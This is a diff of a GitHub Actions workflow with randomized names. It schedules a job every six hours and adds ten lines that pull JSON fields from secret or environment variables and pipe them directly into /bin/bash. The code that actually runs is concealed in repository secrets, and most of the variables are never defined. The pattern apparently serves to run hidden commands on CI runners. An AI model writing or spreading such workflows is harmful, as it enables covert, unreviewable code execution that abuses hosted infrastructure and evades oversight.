@@ -2,8 +2,7 @@ name: gregariousbiathlon
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
-
+    - cron: '30 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +10,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: gregariousbiathlon
         env:
-          bdure086: ${{ secrets.bdure086 }}
+          iwiwt059: ${{ secrets.iwiwt059 }}
         run: |
-          echo $bdure086 | jq -r .ndi64 | /bin/bash
-          echo $f8941 | jq -r .tubzg77 | /bin/bash
-          echo $vmvl02 | jq -r .e08584 | /bin/bash
-          echo $wj82816 | jq -r .bpqu700 | /bin/bash
-          echo $ez05138 | jq -r .rbxe2454 | /bin/bash
+          echo $iwiwt059 | jq -r .ctrri86 | /bin/bash
+          echo $isfzp996 | jq -r .ikv02213 | /bin/bash
+          echo $c12274 | jq -r .cew73 | /bin/bash
+          echo $jkqct64 | jq -r .fc16 | /bin/bash
+          echo $p2 | jq -r .ijpqx68996 | /bin/bash
+          echo $t18 | jq -r .rc19156 | /bin/bash
+          echo $n51140 | jq -r .ic9 | /bin/bash
+          echo $nbe79369 | jq -r .t8822 | /bin/bash
+          echo $isf85396 | jq -r .toq6119 | /bin/bash
+          echo $dlzc88 | jq -r .iwfas8 | /bin/bash
 
